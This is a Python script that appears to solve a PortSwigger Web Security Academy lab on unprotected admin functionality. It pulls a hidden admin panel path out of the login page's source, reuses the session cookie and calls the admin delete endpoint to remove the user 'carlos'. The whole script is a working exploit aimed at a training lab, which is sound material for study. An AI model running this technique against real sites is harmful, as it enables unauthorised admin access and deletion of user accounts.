###########################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 4/9/2023
#
# Lab: Unprotected admin functionality with unpredictable URL
#
# Steps: 1. Fetch the /login page
#        2. Extract the admin panel path from the source code
#        3. Fetch the admin panel
#        4. Delete carlos
#
###########################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0ae3006603d3c9ff82f23e0000d8009f.web-security-academy.net"

try:  
    # fetch /login page
    get_login = requests.get(f"{url}/login")
    
except:
    print(Fore.RED + "[!] Failed to fetch /login through exception")
    exit(1)

print(Fore.WHITE + "1. Fetching /login page.. " + Fore.GREEN + "OK")

# extract the hidden path
admin_panel_path = re.findall("'(/admin-.*)'", get_login.text)[0]

# get session cookie
session = get_login.cookies.get("session")

print(Fore.WHITE + "2. Extracting the admin panel path from the source code.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_panel_path)

# set session cookie
cookies = {
    "session": session
}

try:   
    # fetch admin panel
    # this step is not necessary in the script, you can do step 4 directrly
    # it's a must only when solving the lab using the browser
    admin_panel = requests.get(f"{url}{admin_panel_path}", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch admin panel through exception")
    exit(1)

print(Fore.WHITE + "3. Fetching the admin panel.. " + Fore.GREEN + "OK")

try:  
    # delete the carlos
    delete_carlos = requests.get(f"{url}{admin_panel_path}/delete?username=carlos", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to delete carlos through exception")
    exit(1)

print(Fore.WHITE + "4. Deleting carlos.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")




